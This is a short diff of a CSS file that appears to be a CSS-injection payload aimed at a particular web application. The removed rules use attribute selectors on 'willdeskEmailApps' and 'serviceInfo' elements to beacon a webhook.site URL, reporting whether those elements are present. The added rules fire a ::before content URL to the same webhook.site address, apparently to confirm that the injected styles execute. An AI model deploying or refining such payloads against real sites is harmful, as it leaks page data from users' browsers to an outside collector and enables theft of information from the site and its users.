@@ -1,6 +1,10 @@
-div[id^="willdeskEmailApps"] {
-  background: url(//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?found=willdeskDiv);
+details{
+animation:a 1s;
 }
-div[style*="serviceInfo"] {
-  background: url(//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?found=serviceInfo);
+@keyframes a{
+from{opacity:1}
+to{opacity:1}
+}
+details::before{
+content:url("//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?css=1");
 }
